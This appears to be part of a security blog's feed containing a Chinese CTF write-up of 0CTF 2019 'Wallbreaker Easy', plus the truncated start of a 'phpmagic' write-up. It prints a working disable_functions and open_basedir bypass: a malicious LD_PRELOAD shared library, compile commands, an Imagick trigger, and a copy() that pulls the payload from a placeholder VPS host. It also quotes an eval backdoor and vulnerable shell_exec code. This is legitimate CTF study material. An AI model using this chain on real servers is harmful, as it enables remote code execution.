      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 0CTF Web WriteUp</title>
    <link href="http://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/"/>
    <id>http://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/</id>
    <published>2019-03-25T06:15:04.000Z</published>
    <updated>2019-03-29T06:20:31.763Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>二刷0ctf，去年被虐的很惨，今年还是一样 :(</p><h2 id="Ghost-Pepper"><a href="#Ghost-Pepper" class="headerlink" title="Ghost Pepper"></a>Ghost Pepper</h2><p>jolokia/list发现karaf，动态路由安装webconsole……直接结束</p><h2 id="Wallbreaker-Easy"><a href="#Wallbreaker-Easy" class="headerlink" title="Wallbreaker Easy"></a>Wallbreaker Easy</h2><p>拿到题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Imagick is a awesome library for hackers to break `disable_functions`.</span><br><span class="line">So I installed php-imagick in the server, opened a `backdoor` for you.</span><br><span class="line">Let&apos;s try to execute `/readflag` to get the flag.</span><br><span class="line">Open basedir: /var/www/html:/tmp/d4dabdbc73b87e364e29e60c60a92900</span><br><span class="line">Hint: eval($_POST[&quot;backdoor&quot;]);</span><br></pre></td></tr></table></figure></p><p>题目给了3个信息：</p><ul><li>execute <code>/readflag</code> to get the flag</li><li>Open basedir: /var/www/html:/tmp/d4dabdbc73b87e364e29e60c60a92900</li><li>Hint: eval($_POST[“backdoor”]);</li></ul><p>我们知道题目是有后门的，但是有<code>disable_functions</code>限制，所以我们首先查看一下phpinfo内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail</span><br></pre></td></tr></table></figure></p><p>过滤非常多，但思路非常清晰：<br>1.bypass open basedir<br>2.bypass disable functions<br>3.execute readflag</p><h3 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open basedir"></a>open basedir</h3><p>我们做个简单的测试<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">php &gt; ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html'</span>);</span><br><span class="line">php &gt; var_dump(scandir(<span class="string">'/var/www/html'</span>));</span><br><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"."</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">2</span>) <span class="string">".."</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  string(<span class="number">7</span>) <span class="string">"hack.so"</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  string(<span class="number">10</span>) <span class="string">"index.html"</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  string(<span class="number">23</span>) <span class="string">"index.nginx-debian.html"</span></span><br><span class="line">&#125;</span><br><span class="line">php &gt; var_dump(scandir(<span class="string">'/tmp'</span>));</span><br><span class="line">bool(<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure></p><p>即open basedir是用来限制访问目录的，我们看一下题目源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backdoor=readfile(&apos;index.php&apos;);</span><br></pre></td></tr></table></figure></p><p>可以得到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir = <span class="string">"/tmp/"</span> . md5(<span class="string">"$_SERVER[REMOTE_ADDR]"</span>);</span><br><span class="line">mkdir($dir);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/var/www/html:'</span> . $dir);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;.pre &#123;word-<span class="keyword">break</span>: <span class="keyword">break</span>-all;max-width: <span class="number">500</span>px;white-space: pre-wrap;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;pre class="pre"&gt;&lt;code&gt;Imagick is a awesome library for hackers to break `disable_functions`.</span><br><span class="line">So I installed php-imagick in the server, opened a `backdoor` <span class="keyword">for</span> you.</span><br><span class="line">Let<span class="string">'s try to execute `/readflag` to get the flag.</span></span><br><span class="line"><span class="string">Open basedir: &lt;?php echo ini_get('</span>open_basedir<span class="string">');?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php eval($_POST["backdoor"]);?&gt;</span></span><br><span class="line"><span class="string">Hint: eval($_POST["backdoor"]);</span></span><br><span class="line"><span class="string">&lt;/code&gt;&lt;/pre&gt;&lt;/body&gt;</span></span><br></pre></td></tr></table></figure></p><p>题目也是使用了这样的限制，我们只能访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/tmp/md5(&quot;$_SERVER[REMOTE_ADDR]);</span><br><span class="line">/var/www/html</span><br></pre></td></tr></table></figure></p><p>那么如何bypass open basedir与disable functions呢这里不难搜到这样一篇文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/</span><br></pre></td></tr></table></figure></p><p>文中提及，我们可以用<code>LD_PRELOAD</code>+<code>putenv</code>打一套组合拳，既能绕过open basedir，又能绕过disable functions</p><h3 id="LD-PRELOAD与putenv"><a href="#LD-PRELOAD与putenv" class="headerlink" title="LD_PRELOAD与putenv"></a>LD_PRELOAD与putenv</h3><p>这里我们先来看一下原理，首先什么是LD_PRELOAD？<br>google给出如下定义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</span><br></pre></td></tr></table></figure></p><p>即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用<br>而putenv可以设置环境变量<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv ( string $setting ) : bool</span><br></pre></td></tr></table></figure></p><p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。<br>同时该函数也未被过滤。那么我们可以有如下骚操作：<br>1.制作一个恶意shared libraries<br>2.使用putenv设置LD_PRELOAD为恶意文件路径<br>3.使用某个php函数，触发specific shared library<br>4.成功进行RCE<br><img src="/images/2019-03-25-15-17-11.png" alt=""><br>而既然要在php运行时被触发，那么势必选择一个非常常用的函数才行<br>那么怎么找到这个函数呢？</p><h3 id="传统方式-hijacking-function"><a href="#传统方式-hijacking-function" class="headerlink" title="传统方式(hijacking function)"></a>传统方式(hijacking function)</h3><p>在已有的文章中显示，一般使用php<code>mail()</code>函数进行触发，我们简单分析一下<br>这里简单写个demo<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mail(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们strace一下，可以看到运行这个脚本的时候，程序会启子进程来调用sendmail<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;test.php&quot;], [/* 20 vars */]) = 0</span><br><span class="line">[pid 23864] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/sendmail -t -i &quot;], [/* 20 vars */]) = 0</span><br><span class="line">[pid 23865] execve(&quot;/usr/sbin/sendmail&quot;, [&quot;/usr/sbin/sendmail&quot;, &quot;-t&quot;, &quot;-i&quot;], [/* 20 vars */]) = 0</span><br></pre></td></tr></table></figure></p><p>那么我们只要看一下sendmail使用了哪些函数<br><img src="/images/2019-03-26-09-50-30.png" alt=""><br>有很多函数可以使用，这里可以选择geteuid()，然后我们编写自己的evil shared libraries：hack.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="string">"ls / &gt; /tmp/sky"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">geteuid</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后编译一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure></p><p>然后我们运行脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./hack.so"</span>);</span><br><span class="line">mail(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-26-10-04-10.png" alt=""><br>不难发现它执行了命令，然后可以发现/tmp目录下多了一个文件sky<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@sky:~# ls /tmp | grep sky</span><br><span class="line">sky</span><br></pre></td></tr></table></figure></p><p>我们查看一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@sky:~# cat /tmp/sky</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p><p>发现成功执行命令</p><h3 id="改进版-hijack-shared-library"><a href="#改进版-hijack-shared-library" class="headerlink" title="改进版(hijack shared library)"></a>改进版(hijack shared library)</h3><p>但其实这个方法是将条件变得严苛了，我们干的事情局限于找到一个函数，然后对其进行注入<br>但实际上我们可以更加直接，我们先将sendmail进行删除<br><img src="/images/2019-03-26-10-16-07.png" alt=""><br>如图所示现在已经没有了sendmail，但我们依旧可以进行rce，可使用如下文件sky.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(&quot;ls&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其中<code>__attribute__ ((__constructor__))</code>有如下说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.It&apos;s run when a shared library is loaded, typically during program startup.</span><br><span class="line">2.That&apos;s how all GCC attributes are; presumably to distinguish them from function calls.</span><br><span class="line">3.The destructor is run when the shared library is unloaded, typically at program exit.</span><br></pre></td></tr></table></figure></p><p>所以当我们最开始将evil shared library load上后，就会触发<code>__attribute__ ((__constructor__))</code>，从而达成我们rce的目的.</p><h3 id="函数寻找"><a href="#函数寻找" class="headerlink" title="函数寻找"></a>函数寻找</h3><p>但本题中mail函数已被disable_functions限制，所以我们并不能按照上述模式进行攻击。那么我们要找到一个什么样的函数才能满足我们的条件呢？<br>从上述内容不难发现，我们必须找到一个能在运行时候启动子进程的函数才行，因为我们设置了环境变量，必须restart才能生效，所以如果能启动一个子进程，那么我们的设置的LD_PRELOAD就会加载我们的evil shared library.<br>这里我们发现题目提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">So I installed php-imagick in the server, opened a `backdoor` for you.</span><br></pre></td></tr></table></figure></p><p>所以我们主要探究php-imagick到底能不能干类似的事情<br>我们阅读php-imagick源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ImageMagick/ImageMagick</span><br></pre></td></tr></table></figure></p><p>我们发现如下对应关系<br><img src="/images/2019-03-26-10-30-31.png" alt=""><br>我们发现当文件是MPEG format时，程序会调用’ffmpeg’ program进行转换，而如下后缀都被认为成MPEG format<br><img src="/images/2019-03-26-09-40-53.png" alt=""><br>我们测试一下.wmv<br>写出脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'sky.wmv'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [/* 21 vars */]) = 0</span><br><span class="line">[pid 25217] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;\&quot;ffmpeg\&quot; -v -1 -i \&quot;/tmp/magick-2&quot;...], [/* 21 vars */]) = 0</span><br></pre></td></tr></table></figure></p><p>可以发现的确成功启动了子进程，调用了ffmpeg<br>但是如果sky.wmv文件不存在时<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [/* 21 vars */]) = 0</span><br></pre></td></tr></table></figure></p><p>则不会调用ffmpeg<br>所以也不难分析出，应该是有一步判断文件是否存在的操作，再会去进行调用相关程序进行解码转换的操作<br>所以如果想利用Imagick新起子进程，那么我们得先有后面的参数文件，当然这并不是什么难事。</p><h3 id="payload-amp-attack"><a href="#payload-amp-attack" class="headerlink" title="payload &amp; attack"></a>payload &amp; attack</h3><p>那么只剩最后的攻击了，找到了可以起子进程的方式，只差构造evil shared library了<br>我们还是用之前的sky.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(<span class="string">"ls"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后编译一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC sky.c -o sky</span><br><span class="line">gcc --share sky -o sky.so</span><br></pre></td></tr></table></figure></p><p>测试一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./sky.so"</span>);</span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'sky.wmv'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>运行发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@sky:~# php sky.php</span><br><span class="line">bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  systest  tmp  usrvar  vmlinuz  vmlinuz.old</span><br><span class="line">PHP Fatal error:  Uncaught ImagickException: unable to open image `/tmp/magick-25528VpF8npGTawCz.pam&apos;: No such file or directory @ error/blob.c/OpenBlob/2712 in /root/sky.php:3</span><br><span class="line">Stack trace:</span><br><span class="line">#0 /root/sky.php(3): Imagick-&gt;__construct(&apos;sky.wmv&apos;)</span><br><span class="line">#1 &#123;main&#125;</span><br><span class="line">  thrown in /root/sky.php on line 3</span><br></pre></td></tr></table></figure></p><p>我们成功的进行了列目录</p><h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>那么现在思路很清晰：<br>1.把我们的sky.so和sky.wmv上传到题目的/tmp/sandbox中<br>2.利用backdoor运行sky.php<br>3.在tmp目录读取重定向的结果<br>首先我们按照题目意思，调用/readflag<br>文件内容为<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(<span class="string">"/readflag &gt; /tmp/d4dabdbc73b87e364e29e60c60a92900/flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后是上传文件，我们有很多种方法，这里可以使用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$upload = <span class="string">'/tmp/d4dabdbc73b87e364e29e60c60a92900/sky.wmv'</span>;</span><br><span class="line"><span class="keyword">echo</span> copy(<span class="string">"http://vps_ip/sky.wmv"</span>, $upload);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-26-10-54-53.png" alt=""><br>我们可以看到上传成功了<br>然后我们执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">putenv(<span class="string">"LD_PRELOAD=/tmp/d4dabdbc73b87e364e29e60c60a92900/sky.so"</span>);</span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'/tmp/d4dabdbc73b87e364e29e60c60a92900/sky.wmv'</span>);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-26-12-15-37.png" alt=""><br>可以看到flag已经打到了/tmp目录下<br>我们进行读取即可<br><img src="/images/2019-03-26-12-16-50.png" alt=""></p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这个题目还是比较有趣的，学习到了不少姿势~</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于安全客</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;二刷0ctf，去年被虐的很惨，今年还是一样 :(&lt;/p&gt;
&lt;h2 id=&quot;Ghost-Pepper&quot;&gt;&lt;a href=&quot;#Ghost-Pep
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2018 Code Breaking(4) &amp; phpmagic</title>
    <link href="http://skysec.top/2019/03/10/2018-Code-Breaking-4-phpmagic/"/>
    <id>http://skysec.top/2019/03/10/2018-Code-Breaking-4-phpmagic/</id>
    <published>2019-03-10T04:59:20.000Z</published>
    <updated>2019-03-29T04:52:22.929Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前些日子有些忙，没有继续做，现在跟进，先看下之前做的几道题：<br>2018 Code Breaking(1) &amp; function ：关于<code>\</code>的trick<br>2018 Code Breaking(2) &amp; pcrewaf：关于正则回溯的bypass手段<br>2018 Code Breaking(3) &amp; phplimit：php无参数函数执行RCE<br>今天研究一下phpmagic这道题</p><h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><p>拿到题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://106.14.114.127:24004/?read-source=1</span><br></pre></td></tr></table></figure></p><p>发现源代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line"></span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">.......</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">    $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">    $output = shell_exec($command);</span><br><span class="line">    $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line">    $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">    <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;file_put_contents($log_name, $output); &#125;</span><br><span class="line">     <span class="keyword">echo</span> $output;</span><br><span class="line"> <span class="keyword">endif</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>注意到题目首先创建了一个沙盒做用户分割<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br></pre></td></tr></table></figure></p><p>然后接受用户传入的2个值<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br></pre></td></tr></table></figure></p><p>然后对用户输入的<code>$domain</code>进行拼接命令执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$command = sprintf(<span class="string">"dig -t A -q %s"</span>, 